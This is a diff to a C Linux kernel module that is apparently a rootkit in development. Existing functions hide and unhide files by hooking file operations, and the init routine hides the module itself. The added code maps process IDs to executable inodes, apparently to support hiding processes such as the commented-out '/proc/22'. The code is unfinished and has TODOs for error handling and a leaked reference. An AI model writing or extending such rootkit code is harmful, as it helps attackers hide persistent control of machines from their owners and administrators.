@@ -3,6 +3,8 @@
 #include <linux/path.h>
 #include <linux/namei.h>
 #include <linux/fs.h>
+#include <linux/pid.h>
+#include <linux/sched/task.h>
 #include <linux/kernel.h>
 #include <linux/slab.h>
 
@@ -266,11 +268,44 @@ static int unhide_file(const char *path_name) {
 	return free_fops_hook(inode);
 }
 
+static unsigned long get_exec_ino_by_pid(int pid) {
+    struct pid *pid_struct;
+    struct task_struct *task_struct;
+    char task_comm[16];
+    unsigned long result = 0;
+
+    pid_struct = find_get_pid(pid);
+    task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);
+    get_task_comm(task_comm, task_struct);
+
+    printk(KERN_INFO "task %d comm: %s", pid, task_comm);
+    // TODO: handle errors
+    if (task_struct->mm && task_struct->mm->exe_file) {
+        printk(KERN_INFO "task exe inode num: %lu", task_struct->mm->exe_file->f_inode->i_ino);
+        result = task_struct->mm->exe_file->f_inode->i_ino;
+    }
+
+    put_task_struct(task_struct);
+    put_pid(pid_struct);
+    return result;
+}
+
+static int pid_matches_exec_path_name(int pid, const char *path_name) {
+    struct inode *inode;
+
+    // TODO: put inode
+    // TODO: handle errors
+    get_inode_by_path_name(path_name, &inode);
+    return inode->i_ino == get_exec_ino_by_pid(pid);
+}
+
 static int __init MRK_initialize(void) {
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
-	hide_file("/proc/22");
 	unhide_file(test_path_name2);
+	get_exec_ino_by_pid(2609);
+//	hide_file("/proc/22");
+//  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
